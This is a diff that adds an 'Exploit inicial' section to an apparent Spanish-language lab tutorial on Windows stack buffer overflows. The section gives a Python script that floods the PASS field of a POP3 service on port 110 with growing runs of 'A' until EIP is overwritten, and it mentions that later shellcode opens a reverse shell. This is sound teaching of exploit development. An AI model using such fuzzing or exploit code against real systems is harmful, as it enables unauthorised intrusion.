@@ -57,5 +57,60 @@ Una explicación sencilla sería la siguiente. Cuando alguien se autentica contr
 
 Se trata de tomar el control del registro EIP, que siempre apunta a la próxima dirección de memoria a ejecutar, para que el flujo del programa se desplace hasta la dirección que nosotros queramos, donde habremos sobreescrito los valores de esas direcciones con nuestro shellcode, que nos lanzará una reverse shell y nos conectará a la máquina victima.
 
+## Exploit inicial
 
+Empezamos con el exploit. Crearemos un script en python que se conectará a la máquina windows en el puerto 110 y le pasará un usuario, y en el campo PASS le iremos pasando el carácter "A" muchas veces para ver cuando corrompe el programa.
+
+El código es el siguiente:
+
+```python
+#!/usr/bin/python
+#coding: utf-8
+
+from pwn import *
+import socket, sys
+
+if len(sys.argv) < 2:
+        print "\n[!] Uso: python " + sys.argv[0] + " <ip_address>\n"
+        sys.exit(0)
+
+#Variables globales
+ip_address = '192.168.1.20'
+rport = 110
+
+if __name__ == '__main__':
+        buffer = ["A"]
+        contador = 350
+
+        while len(buffer) < 32:
+                buffer.append("A"*contador)
+                contador += 350
+
+
+        p1 = log.progress("Data")
+
+
+        for strings in buffer:
+
+                try:
+                        p1.status("Enviando %s bytes" % len(strings))
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip_address, rport))
+
+                        data = s.recv(1024)
+
+                        s.send("USER ximo\r\n")
+                        data = s.recv(1024)
+                        s.send("PASS %s\r\n" % strings)
+                        data = s.recv(1024)
+
+                except:
+                        print "\n[!] Ha habido un error de conexión\n"
+                        sys.exit(1)
+
+```
+
+Ejecutamos el exploit y vemos lo que sucede en el inmunity debuguer. Podemos ver que se ha corrompido el programa porque hemos sobreescrito direcciones de memória, incluido el registro EIP que ahora apunta a la dirección 0x41414141, que son nuestras "A", y al no ser una dirección válida se detiene el flujo de ejecución.
+
+![](/assets/images/Stack-Buffer-Overflow-Windows/exploit-inicial.png)
 
